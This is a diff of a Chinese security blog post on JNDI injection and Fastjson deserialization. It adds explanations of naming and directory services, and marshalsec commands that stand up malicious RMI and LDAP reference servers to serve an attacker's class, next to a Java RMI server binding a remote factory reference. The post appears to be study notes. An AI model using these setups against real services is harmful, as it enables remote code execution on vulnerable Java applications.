@@ -79,16 +79,19 @@
 
 
 
-<meta name="description" content="JNDI注入与Fastjson反序列化参考https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7027#toc-5 JNDIJNDI全名为&#96;&#96;Java Naming and Directory Interface，Java命名和目录接口。通过JNDI这个接口，可以调用如LDAP, RMI, DNS, NIS，许多种服务。在JNDI中通过Lookup(url)去调用远程代码。如果我们可以控制url&#96;参数">
+<meta name="description" content="JNDI注入与Fastjson反序列化参考https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7027#toc-5https:&#x2F;&#x2F;evilpan.com&#x2F;2021&#x2F;12&#x2F;13&#x2F;jndi-injection&#x2F;#jndi-101 JNDIJNDI全名为&#96;&#96;Java Naming and Directory Interface，Java命名和目录接口。通过JNDI这个接口，可以调用如LDAP, RMI, D">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JNDI注入">
 <meta property="og:url" content="http://example.com/2022/03/31/JNDI%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Recoder">
-<meta property="og:description" content="JNDI注入与Fastjson反序列化参考https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7027#toc-5 JNDIJNDI全名为&#96;&#96;Java Naming and Directory Interface，Java命名和目录接口。通过JNDI这个接口，可以调用如LDAP, RMI, DNS, NIS，许多种服务。在JNDI中通过Lookup(url)去调用远程代码。如果我们可以控制url&#96;参数">
+<meta property="og:description" content="JNDI注入与Fastjson反序列化参考https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7027#toc-5https:&#x2F;&#x2F;evilpan.com&#x2F;2021&#x2F;12&#x2F;13&#x2F;jndi-injection&#x2F;#jndi-101 JNDIJNDI全名为&#96;&#96;Java Naming and Directory Interface，Java命名和目录接口。通过JNDI这个接口，可以调用如LDAP, RMI, D">
 <meta property="og:locale">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618152827.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416150939.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416151229.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416152058.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618165238.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618160947.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416162942.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416163016.png">
 <meta property="article:published_time" content="2022-03-31T08:13:54.000Z">
@@ -99,7 +102,7 @@
 <meta property="article:tag" content="反序列化">
 <meta property="article:tag" content="FastJson">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416150939.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618152827.png">
 
 
 
@@ -401,10 +404,22 @@
       
 
       
-        <h1 id="JNDI注入与Fastjson反序列化"><a href="#JNDI注入与Fastjson反序列化" class="headerlink" title="JNDI注入与Fastjson反序列化"></a>JNDI注入与Fastjson反序列化</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7027#toc-5">https://xz.aliyun.com/t/7027#toc-5</a></p>
+        <h1 id="JNDI注入与Fastjson反序列化"><a href="#JNDI注入与Fastjson反序列化" class="headerlink" title="JNDI注入与Fastjson反序列化"></a>JNDI注入与Fastjson反序列化</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7027#toc-5">https://xz.aliyun.com/t/7027#toc-5</a><br><a target="_blank" rel="noopener" href="https://evilpan.com/2021/12/13/jndi-injection/#jndi-101">https://evilpan.com/2021/12/13/jndi-injection/#jndi-101</a></p>
 <h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI全名为``Java Naming and Directory Interface<code>，</code>Java命名和目录接口<code>。通过JNDI这个接口，可以调用如LDAP, RMI, DNS, NIS，许多种服务。在JNDI中通过</code>Lookup(url)<code>去调用远程代码。如果我们可以控制</code>url`参数，更改为恶意远程服务器地址。可以通过JNDI配合RMI和LDAP让服务端运行我们部署在公网上的恶意类。</p>
+<p>通过JNDI的名称知道，JNDI是提供<code>Naming</code> 和<code>Directory</code>的接口服务。但是<code>Naming</code>和<code>Directory</code>又分别是什么东西。</p>
 <span id="more"></span>
 
+<h3 id="Naming"><a href="#Naming" class="headerlink" title="Naming"></a>Naming</h3><p><code>Naming</code>这个地方实际上指的是<code>Naming Service</code><strong>名称服务</strong>，通过名称找到对应的目标。例如:</p>
+<ul>
+<li>DNS服务通过域名查找ip</li>
+<li>文件系统通过目录找到具体的文件</li>
+</ul>
+<p>同样有一个重要的名称服务<code>LDAP</code>(Lightweight Directory Access Protocol)，轻量级目录访问协议。它的协议格式是从又往左进行逐级定义，以<code>,</code>为分隔符，每一级为<code>name=value</code>的键值对。比如:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn=john,o=Sun,c=us</span><br></pre></td></tr></table></figure>
+<p>意为在c=us的域中查找o=Sun的子域，在o=Sun的子域中再去查找cn=john的对象。</p>
+<p>同时在名称系统中有几个重要的概念。<br><strong>Bindings</strong>:表示名称和对象的绑定关系，比如通过域名绑定ip,通过目录绑定文件<br><strong>Context</strong>:上下文。一个上下文对应这一个绑定，通过指定的上下文来查找唯一的对象。在文件系统中，一个目录就是一个上下文，其中的目录也称为子上下文(Subcontext)<br><strong>References</strong>:在一个实际的名称系统中，对象可能无法直接存储在系统中，这时需要通过类似于引用的关系进行调用。类似于指针</p>
+<h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><p>目录系统是名称系统的扩展，可以对于名称系统中具体对象的属性进行增删改查。关键就在于通过属性的查询到具体的对象。Naming只能通过名称找到对应的对象，但是通过Directory就可以通过对象中的属性来找到对象。域中的AD就是经典的Directory服务。</p>
+<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>通过JNDI。JAVA可以与不同的目录服务提供统一的接口，JNDI的架构如下。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618152827.png"><br>用户通过API使用目录服务，而厂商通过编写SPI来适配目录服务，用户不需要重复修改代码。</p>
 <h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>通过RMI可以让用户调用远程服务器上的代码，但是一般RMI是将数据发送到服务端实现代码的远程调用。但是如果RMI通过一个<code>Reference类</code>绑定一个外部远程对象。如果用户在当前目录没有这个对象，这用户将通过<code>Reference</code>中设置的远程地址和<code>Factory</code>去引用远程外部类，并且实例化。</p>
 <p>服务端代码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">            Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;whatever&quot;</span>, <span class="string">&quot;jndi.Calc&quot;</span>, <span class="string">&quot;http://localhost/&quot;</span>);</span><br><span class="line">            ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(<span class="string">&quot;calc&quot;</span>, wrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -431,9 +446,19 @@
 <p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416151229.png"></p>
 <p>当删除文件夹中的clac.class文件，再次运行。这次在日志中就出现了对应的访问记录。</p>
 <p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416152058.png"></p>
-<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>暂时没看</p>
+<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>与RMI类似通过引用外部实例达到RCE的效果。</p>
+<h3 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h3><p>可以使用marshalsec达到快速开启LDAP和RMI服务的效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rmi</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/#ExportObject 8088</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>#</code>后面填写你的恶意类的类名，它会自动绑定URI，8088是你开启rmi服务的端口号，如果不加端口号，它的默认端口号为1099.恶意类建议使用jdk1.6编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldap</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/文件夹/#ExportObject 8088</span><br></pre></td></tr></table></figure>
+<p>ldap默认端口为1389</p>
+<p>在Client访问的时候，url后可以接任意文件名，marshalsec会自动绑定。 但是需要确保启动服务时的文件名，与web目录中文件名对应.<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618165238.png"></p>
+<h3 id="JNDI注入和版本的关系"><a href="#JNDI注入和版本的关系" class="headerlink" title="JNDI注入和版本的关系"></a>JNDI注入和版本的关系</h3><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618160947.png"></p>
 <h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
-<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>序列化:  <code>Stirng text =  JSON.toJSONString(obj)</code></p>
+<h3 id="API-1"><a href="#API-1" class="headerlink" title="API"></a>API</h3><p>序列化:  <code>Stirng text =  JSON.toJSONString(obj)</code></p>
 <p>反序列化:</p>
 <ol>
 <li><code>obj = JSON.parse(text)  //解析为JSONobject 类型或者 JSONArray类型</code></li>
@@ -590,7 +615,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-count">59</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -612,7 +637,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">70</span>
+                  <span class="site-state-item-count">71</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -645,7 +670,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI%E6%B3%A8%E5%85%A5%E4%B8%8EFastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">JNDI注入与Fastjson反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI"><span class="nav-number">1.2.</span> <span class="nav-text">JNDI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI"><span class="nav-number">1.2.1.</span> <span class="nav-text">RMI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LDAP"><span class="nav-number">1.2.2.</span> <span class="nav-text">LDAP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson"><span class="nav-number">1.3.</span> <span class="nav-text">FastJson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.3.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#API"><span class="nav-number">1.3.2.</span> <span class="nav-text">API</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98"><span class="nav-number">1.3.3.</span> <span class="nav-text">问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Template"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">Template</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JNDI-1"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">JNDI</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AF%9D"><span class="nav-number">1.4.</span> <span class="nav-text">后话</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI%E6%B3%A8%E5%85%A5%E4%B8%8EFastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">JNDI注入与Fastjson反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI"><span class="nav-number">1.2.</span> <span class="nav-text">JNDI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Naming"><span class="nav-number">1.2.1.</span> <span class="nav-text">Naming</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Directory"><span class="nav-number">1.2.2.</span> <span class="nav-text">Directory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#API"><span class="nav-number">1.2.3.</span> <span class="nav-text">API</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI"><span class="nav-number">1.2.4.</span> <span class="nav-text">RMI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LDAP"><span class="nav-number">1.2.5.</span> <span class="nav-text">LDAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#marshalsec"><span class="nav-number">1.2.6.</span> <span class="nav-text">marshalsec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%92%8C%E7%89%88%E6%9C%AC%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="nav-number">1.2.7.</span> <span class="nav-text">JNDI注入和版本的关系</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson"><span class="nav-number">1.3.</span> <span class="nav-text">FastJson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.3.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#API-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">API</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98"><span class="nav-number">1.3.3.</span> <span class="nav-text">问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Template"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">Template</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JNDI-1"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">JNDI</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AF%9D"><span class="nav-number">1.4.</span> <span class="nav-text">后话</span></a></li></ol></li></ol></div>
             
 
           </div>
